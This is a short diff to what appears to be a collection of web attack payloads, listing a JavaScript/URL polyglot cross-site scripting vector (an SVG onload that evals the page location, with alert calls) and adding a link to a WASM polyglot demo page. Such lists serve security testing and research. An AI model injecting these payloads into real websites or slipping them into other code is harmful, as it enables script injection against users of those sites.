@@ -1,3 +1,6 @@
 
 #JS/URL polyglot"
 data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
+
+#WASM
+https://vulnerabledoma.in/polyglot/wasmjscsshtml.html
